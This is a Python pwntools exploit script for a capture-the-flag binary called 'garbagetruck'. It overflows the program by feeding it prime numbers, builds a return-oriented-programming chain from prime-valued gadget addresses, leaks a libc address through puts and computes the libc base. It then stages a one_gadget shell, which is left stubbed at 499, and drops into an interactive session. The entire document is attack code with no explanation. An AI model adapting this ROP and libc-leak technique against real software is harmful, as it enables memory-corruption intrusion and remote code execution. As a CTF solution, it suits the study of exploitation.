from pwn import *
import gmpy2
from sympy import isprime
from sympy import sieve

primes = list(sieve.primerange(0, 5000))

def sendprime(prime):
    assert(isprime(prime))
    print p.recvuntil(">")
    p.sendline(str(prime))
    
def find_primes(target):
    nextprime = target
    while True:
	nextprime = gmpy2.next_prime(nextprime)
	if gmpy2.is_prime(nextprime-target):
	    print "Found", hex(nextprime), hex(nextprime-target)
	    return nextprime, nextprime-target
	    break

# while True:
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("garbagetruck.chal.pwning.xxx", 6349)
else:
    p = process("./garbagetruck")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
	gdb.attach(p, """
	      set disassembly-flavor intel
	       b *0x401ed2
	       """)

for i in range(27):
    sendprime(0x41414143)

# at overflow, craft payload
pop_rdi = 0x0000000000403043
pop_rbp = 0x0000000000505f5b
sub_ebx_ebp = 0x00000000005015b1
pop_rbx_rbp = 0x0000000000401fd1 # also add esp, 8
pop_rbx_rbp_r12 = 0x000000000040259b # add rsp, 16
puts_got = 0x756068
call_rbx = 0x000000000046e1bd
call_rbx_ptr = 0x000000000041b517
mov_rax_rbx = 0x0000000000439bd9 # also pops another val
push_rax_ret = 0x000000000043c003
jmp_rbx = 0x0000000000551729
xchg_rax_rbp = 0x0000000000493ba9

sendprime(xchg_rax_rbp)
sendprime(pop_rbx_rbp_r12)
sendprime(499)
sendprime(499)
sendprime(7692409)# ebx = 7692409
sendprime(17) # ebp
# sendprime(0x7ffff780903d) #rbx
# sendprime(0x3d) # rbp
sendprime(499)
sendprime(sub_ebx_ebp)

# puts arg that contains libc address
sendprime(pop_rdi)
sendprime(0x757cc1)

# call puts
# sendprime(mov_rax_rbx)
# sendprime(499)
# sendprime(push_rax_ret)

sendprime(jmp_rbx)

# return to somewhere in main

prime1, prime2 = find_primes(0x401c02) # libc start main
sendprime(pop_rbx_rbp_r12)
sendprime(499)
sendprime(499)
sendprime(prime1) #rbx
sendprime(prime2) # rbp
sendprime(499)
sendprime(sub_ebx_ebp)
sendprime(call_rbx)

p.sendline("0")
p.recvuntil("like:")

leak = p.recvline()
leak = p.recvline().strip()
leak = ('\x00'+leak+"\x00"*2)
leak = u64(leak)
print "leak", hex(leak)

libc_base = leak -3953920
print "libc base", hex(libc_base)

# one_gadget = libc_base + 0x45271
one_gadget =499
if not isprime(one_gadget):
    print "SAD! one_gadget not prime"
    p.close()
    # continue
print("one_gadget is prime!")

# One_gadget payload
for i in range(2):
    sendprime(str(primes[i]))

# sendprime(one_gadget)
p.sendline("0")
p.interactive()


